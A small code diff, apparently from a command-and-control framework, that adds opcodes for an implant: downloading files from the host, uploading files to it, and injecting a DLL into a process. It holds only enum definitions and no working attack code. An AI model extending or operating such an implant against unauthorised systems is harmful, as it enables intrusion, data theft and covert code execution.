@@ -7,6 +7,9 @@ class Opcodes(Enum):
     SYSINFO = 0x03       # Get system information
     SLEEP = 0x04         # Sleep for a given amount of time
     UPDATE_CONFIG = 0x05 # Update the implant's maleable config
+    DOWNLOAD = 0x06      # Download a file from the implant to the server
+    UPLOAD = 0x07        # Upload a file from the server to the implant
+    INJECT = 0x08        # Inject a DLL into a process
 
     def __str__(self):
         return self.name
